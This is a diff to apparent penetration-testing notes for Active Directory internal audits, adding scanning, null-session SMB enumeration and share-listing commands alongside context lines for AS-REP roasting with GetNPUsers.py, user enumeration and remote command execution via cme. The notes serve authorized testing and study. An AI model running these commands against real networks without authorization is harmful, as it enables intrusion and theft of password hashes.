@@ -1,5 +1,9 @@
 # Internal Audit - Plan
 
+{% embed url="https://github.com/Jean-Francois-C/Windows-Penetration-Testing" %}
+Great One
+{% endembed %}
+
 {% embed url="https://pentestbook.six2dez.com/others/internal-pentest" %}
 
 {% file src="../../.gitbook/assets/Pentest_Active_Directory_Environment_1666475020.pdf" %}
@@ -9,6 +13,10 @@
 ### Scanning
 
 ```bash
+# check what infos you can see
+wireshark
+
+# nmap
 # BEST - https://miloserdov.org/?p=5248
 # discover
 sudo nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml $network_ip
@@ -35,8 +43,9 @@ Check this
 ### If you have no credentials
 
 ```bash
-# get basic infos
-cme smb $ip
+# Get domain name
+cme smb 10.10.10.10
+smbmap -H $dc_ip -u '' -p ''
 
 # Detect SMB on network
 responder-RunFinger -i X.X.X.0/24
@@ -54,10 +63,6 @@ ldapsearch -h <DC.IP> -x -b "DC=XX,DC=XX"
 # Get hashes with no krb preauth
 GetNPUsers.py [Domain Name]/ -dc-ip [Domain Controller IP address] -request
 GetNPUsers.py 'DC.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.10
-
-# Get domain name
-crackmapexec smb 10.10.10.10
-smbmap -H $dc_ip -u '' -p ''
 
 # Get Users List
 GetADUsers.py DC.local/ -dc-ip $dc_ip -debug
@@ -140,6 +145,8 @@ rpcclient -U "DOMAIN/username%password" <domaincontroller name or IP>" -c enumdo
 
 # CME
 # Run commands
+# can you access sensitive shares ? check for SYSVOL
+cme smb <IP> -u <USER> -p '<PASS>' --shares
 
 # PS
 cme smb <IP> -u <USER> -p '<PASS>' -X 'Get-Host'
